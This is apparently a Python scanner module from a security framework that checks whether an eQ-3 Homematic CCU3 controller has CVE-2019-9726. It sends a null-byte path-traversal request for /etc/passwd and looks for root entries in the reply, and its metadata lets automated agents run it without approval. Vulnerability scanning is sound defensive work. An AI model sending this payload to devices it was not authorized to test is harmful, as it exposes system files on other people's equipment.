#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""eQ-3 AG Homematic CCU3 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Homematic CCU3 - Local File Inclusion Detection',
        'description': "eQ-3 AG Homematic CCU3 3.43.15 and earlier allows remote attackers to read arbitrary files of the device's filesystem, aka local file inclusion. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'homematic', 'lfi', 'eq-3', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://atomic111.github.io/article/homematic-ccu3-fileread',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-9726',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2019-9726',
    }

    def run(self):
        r = self.http_request(method="GET", path='/.%00./.%00./etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', 'bin:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Homematic CCU3 - Local File Inclusion detected",
                path='/.%00./.%00./etc/passwd',
            )
            return True
        return False

